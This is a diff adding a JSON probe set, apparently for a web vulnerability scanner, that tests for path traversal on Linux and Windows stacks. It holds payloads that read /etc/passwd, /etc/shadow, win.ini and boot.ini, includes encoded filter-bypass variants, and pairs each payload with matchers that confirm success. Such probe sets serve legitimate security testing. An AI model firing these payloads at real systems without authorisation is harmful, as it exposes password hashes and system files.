@@ -1,0 +1,109 @@
+{
+  "category": "path_traversal",
+  "contexts": {
+    "linux": {
+      "description": "Path traversal probes targeting Linux/Unix file systems via common web stacks",
+      "tech_match": ["Apache", "Nginx", "PHP", "Flask", "Django"],
+      "param_match": ["file", "path", "item", "page", "template", "include", "url", "src", "doc", "dir", "load", "read", "fname"],
+      "probes": [
+        {
+          "payload": "../../../etc/passwd",
+          "description": "Classic three-level path traversal to /etc/passwd on Linux",
+          "matchers": [
+            {"type": "word", "words": ["root:x:0", "root:"], "condition": "or"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 80,
+          "variables": {}
+        },
+        {
+          "payload": "/etc/passwd",
+          "description": "Absolute path injection to /etc/passwd",
+          "matchers": [
+            {"type": "word", "words": ["root:x:0"], "condition": "or"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 80,
+          "variables": {}
+        },
+        {
+          "payload": "....//....//....//etc/passwd",
+          "description": "Double-dot slash bypass for path traversal filters",
+          "matchers": [
+            {"type": "word", "words": ["root:x:0", "root:"], "condition": "or"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 75,
+          "variables": {}
+        },
+        {
+          "payload": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+          "description": "URL-encoded path traversal to /etc/passwd",
+          "matchers": [
+            {"type": "word", "words": ["root:x:0", "root:"], "condition": "or"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 75,
+          "variables": {}
+        },
+        {
+          "payload": "../../../etc/shadow",
+          "description": "Path traversal to /etc/shadow (shadow password file)",
+          "matchers": [
+            {"type": "regex", "pattern": "\\$[156y]\\$[^:]+:[^:]+"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 85,
+          "variables": {}
+        }
+      ]
+    },
+    "windows": {
+      "description": "Path traversal probes targeting Windows file systems via IIS/ASP.NET",
+      "tech_match": ["IIS", "ASP.NET"],
+      "param_match": ["file", "path", "item", "page", "template", "include", "url", "src", "doc", "dir", "load", "read", "fname"],
+      "probes": [
+        {
+          "payload": "..\\..\\..\\windows\\win.ini",
+          "description": "Windows backslash path traversal to win.ini",
+          "matchers": [
+            {"type": "word", "words": ["[extensions]", "for 16-bit"], "condition": "or"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 80,
+          "variables": {}
+        },
+        {
+          "payload": "..\\..\\..\\boot.ini",
+          "description": "Windows path traversal to boot.ini",
+          "matchers": [
+            {"type": "word", "words": ["boot loader", "[operating systems]"], "condition": "or"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 80,
+          "variables": {}
+        },
+        {
+          "payload": "..%5c..%5c..%5cwindows%5cwin.ini",
+          "description": "URL-encoded backslash path traversal to win.ini",
+          "matchers": [
+            {"type": "word", "words": ["[extensions]", "for 16-bit"], "condition": "or"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 75,
+          "variables": {}
+        },
+        {
+          "payload": "C:\\windows\\win.ini",
+          "description": "Absolute Windows path injection",
+          "matchers": [
+            {"type": "word", "words": ["[extensions]", "for 16-bit"], "condition": "or"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 75,
+          "variables": {}
+        }
+      ]
+    }
+  }
+}
